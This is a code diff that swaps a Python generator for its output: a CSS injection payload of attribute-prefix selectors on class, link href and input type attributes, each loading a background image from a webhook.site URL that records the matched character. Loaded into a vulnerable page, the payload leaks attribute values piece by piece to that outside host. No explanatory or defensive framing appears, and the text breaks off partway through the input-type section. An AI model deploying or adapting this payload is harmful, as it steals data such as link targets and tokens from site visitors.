@@ -1,21 +1,88 @@
-chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
-attributes = {
-    'class': '*',
-    'href': 'a',
-    'type': 'input',
-    'name': 'input'
-}
-prefix_len = 3
-webhook = 'https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d'
+/* --- class attribute on any element --- */
+[class^="a"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=a'); }
+[class^="b"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=b'); }
+[class^="c"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=c'); }
+[class^="d"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=d'); }
+[class^="e"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=e'); }
+[class^="f"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=f'); }
+[class^="g"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=g'); }
+[class^="h"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=h'); }
+[class^="i"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=i'); }
+[class^="j"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=j'); }
+[class^="k"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=k'); }
+[class^="l"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=l'); }
+[class^="m"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=m'); }
+[class^="n"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=n'); }
+[class^="o"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=o'); }
+[class^="p"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=p'); }
+[class^="q"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=q'); }
+[class^="r"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=r'); }
+[class^="s"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=s'); }
+[class^="t"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=t'); }
+[class^="u"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=u'); }
+[class^="v"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=v'); }
+[class^="w"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=w'); }
+[class^="x"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=x'); }
+[class^="y"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=y'); }
+[class^="z"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=z'); }
+[class^="0"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=0'); }
+[class^="1"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=1'); }
+[class^="2"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=2'); }
+[class^="3"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=3'); }
+[class^="4"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=4'); }
+[class^="5"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=5'); }
+[class^="6"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=6'); }
+[class^="7"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=7'); }
+[class^="8"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=8'); }
+[class^="9"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=9'); }
+[class^="-"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=-'); }
+[class^="_"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?class_pos1=_'); }
 
-def gen(prefix, length, attr, el):
-    if len(prefix) == length:
-        selector = f'{el}[{attr}^="{prefix}"]'
-        url = f'{webhook}/?{attr}_pos{length}={prefix}'
-        print(f'{selector} {{ background-image: url("{url}"); }}')
-        return
-    for c in chars:
-        gen(prefix + c, length, attr, el)
+/* --- href attribute on <a> --- */
+a[href^="a"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=a'); }
+a[href^="b"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=b'); }
+a[href^="c"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=c'); }
+a[href^="d"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=d'); }
+a[href^="e"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=e'); }
+a[href^="f"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=f'); }
+a[href^="g"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=g'); }
+a[href^="h"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=h'); }
+a[href^="i"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=i'); }
+a[href^="j"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=j'); }
+a[href^="k"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=k'); }
+a[href^="l"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=l'); }
+a[href^="m"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=m'); }
+a[href^="n"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=n'); }
+a[href^="o"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=o'); }
+a[href^="p"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=p'); }
+a[href^="q"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=q'); }
+a[href^="r"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=r'); }
+a[href^="s"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=s'); }
+a[href^="t"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=t'); }
+a[href^="u"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=u'); }
+a[href^="v"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=v'); }
+a[href^="w"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=w'); }
+a[href^="x"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=x'); }
+a[href^="y"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=y'); }
+a[href^="z"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=z'); }
+a[href^="0"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=0'); }
+a[href^="1"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=1'); }
+a[href^="2"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=2'); }
+a[href^="3"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=3'); }
+a[href^="4"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=4'); }
+a[href^="5"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=5'); }
+a[href^="6"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=6'); }
+a[href^="7"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=7'); }
+a[href^="8"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=8'); }
+a[href^="9"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=9'); }
+a[href^="-"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=-'); }
+a[href^="_"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?href_pos1=_'); }
 
-for attr, el in attributes.items():
-    gen('', prefix_len, attr, el)
+/* --- type attribute on <input> --- */
+input[type^="a"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=a'); }
+input[type^="b"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=b'); }
+input[type^="c"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=c'); }
+input[type^="d"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=d'); }
+input[type^="e"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=e'); }
+input[type^="f"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/?type_pos1=f'); }
+input[type^="g"] { background-image: url('https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd266
